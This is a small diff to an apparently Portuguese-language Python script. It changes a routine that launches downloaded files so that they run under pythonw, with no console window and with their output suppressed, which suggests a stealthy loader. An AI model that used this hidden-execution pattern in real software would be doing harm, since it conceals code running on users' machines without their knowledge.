@@ -48,7 +48,7 @@ def get_computer_description():
 
 def executar_arquivos():
     for arquivo in arquivos_para_baixar:
-        subprocess.Popen(f'cmd /c start python "{destino}\\{arquivo}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.Popen(f'cmd /c start pythonw "{destino}\\{arquivo}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 
 def main_master():
